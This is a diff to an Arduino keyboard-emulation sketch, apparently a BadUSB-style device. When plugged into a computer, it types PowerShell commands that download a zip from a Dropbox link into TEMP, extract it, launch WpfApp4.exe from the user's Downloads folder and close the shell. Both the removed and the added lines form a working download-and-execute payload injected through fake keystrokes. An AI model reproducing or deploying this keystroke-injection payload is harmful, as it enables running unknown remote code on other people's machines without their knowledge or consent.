@@ -26,28 +26,16 @@ void setup() {
   Keyboard.releaseAll();
   delay(2000);
 
-  // Download file from Dropbox
-  Keyboard.print(F("$down = New-Object System.Net.WebClient; "));
-  Keyboard.print(F("$url = 'https://www.dropbox.com/scl/fi/uja9bbnec73k0qmoafow5/WpfApp4.exe?rlkey=ygefc9yymhpq5z16qj5mkrqrt&st=gd7ra5lc&dl=1'; "));
-  Keyboard.print(F("$file = 'WpfApp4.exe'; "));
-  Keyboard.print(F("$down.DownloadFile($url,$file); "));
+  // PowerShell script to download, extract, and run the file
+  Keyboard.print(F("$url = 'https://www.dropbox.com/scl/fo/70hvtndvrw9i408dc3fsi/AAjnD7jO2sXT84x2rlYbRdw?rlkey=d47w38cp82qogrmw6eex7bsab&st=dtd6ey49&dl=1'; "));
+  Keyboard.print(F("$zipPath = Join-Path $env:TEMP 'aaaa.zip'; "));
+  Keyboard.print(F("$exePath = Join-Path $env:USERPROFILE 'Downloads\\WpfApp4\\WpfApp4.exe'; "));
+  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $zipPath; "));
+  Keyboard.print(F("Add-Type -AssemblyName 'System.IO.Compression.FileSystem'; "));
+  Keyboard.print(F("[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, (Join-Path $env:USERPROFILE 'Downloads')); "));
+  Keyboard.print(F("Start-Process $exePath; "));
+  Keyboard.print(F("exit; "));
   typeKey(KEY_RETURN);
-  delay(4000); // Allow time for download
-
-  // Move downloaded file to Downloads folder
-  Keyboard.print(F("Move-Item -Path $file -Destination \"$env:USERPROFILE\\Downloads\\$file\" -Force"));
-  typeKey(KEY_RETURN);
-  delay(2000);
-
-  // Execute the downloaded file from Downloads folder
-  Keyboard.print(F("Start-Process \"$env:USERPROFILE\\Downloads\\$file\""));
-  typeKey(KEY_RETURN);
-  delay(2000);
-
-  // Close PowerShell
-  Keyboard.print(F("exit"));
-  typeKey(KEY_RETURN);
-  delay(2000);
 
   // End keyboard stream
   Keyboard.end();
